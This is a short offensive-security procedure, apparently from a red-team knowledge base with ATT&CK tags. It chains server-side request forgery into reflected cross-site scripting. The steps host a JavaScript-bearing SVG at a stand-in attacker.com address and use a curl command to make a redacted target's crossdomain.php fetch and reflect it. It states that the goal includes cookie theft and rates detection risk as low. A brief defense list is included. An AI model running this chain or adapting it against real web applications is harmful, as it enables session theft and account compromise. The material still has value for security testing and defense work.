---
id: proc-ssrf-xss-svg-chain
tags:
  - ssrf
  - xss
  - svg
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-ssrf-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:53:38.696Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques:
  - '[[JavaScript]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Chain-SSRF-to-Reflected-XSS-via-Malicious-SVG

## Summary

This procedure chains SSRF to fetch an externally hosted SVG file containing a reflected XSS payload, allowing execution of JavaScript in the context of the vulnerable endpoint without direct input control.

## Description

By directing the 'url' parameter to an attacker-controlled SVG with embedded JavaScript (e.g., onload event), the server fetches and reflects the content, enabling XSS. This exploits lack of sanitization in the PHP handler. Targets web apps processing external resources. Outcomes: Arbitrary JS execution for stealing cookies or further attacks.

## Requirements

1. Active SSRF in the endpoint
2. External server to host malicious SVG
3. Browser to observe reflection

## Defense

Defensive measures and detection strategies:

- Sanitize and validate fetched content (e.g., strip script tags)
- Content Security Policy (CSP) to block inline JS
- Block SVG or external resource fetching in sensitive contexts

## Objectives

1. Fetch and reflect malicious external content
2. Execute XSS payload
3. Demonstrate potential for data theft or escalation

## Instructions

### Step 1: Host Malicious SVG

**Context**: Create and upload an SVG with XSS payload to an external server.

**Command** (No direct command; manual):
Create file malicious.svg:
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SSRF')">
</svg>
```

> Upload to https://attacker.com/malicious.svg. Verify accessibility.

### Step 2: Trigger SSRF Fetch

**Context**: Use SSRF to pull the SVG, observing reflection and execution.

**Command** ([[commands/curl-ssrf-xss]]):
```bash
curl "http://www.███████/crossdomain.php?url=https://attacker.com/malicious.svg" -v
```

> Response includes SVG content. In browser, view triggers alert. Success: Payload executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/curl-ssrf-xss]]

## Tools Used


## Tags

- [[xss]]
- [[ssrf]]
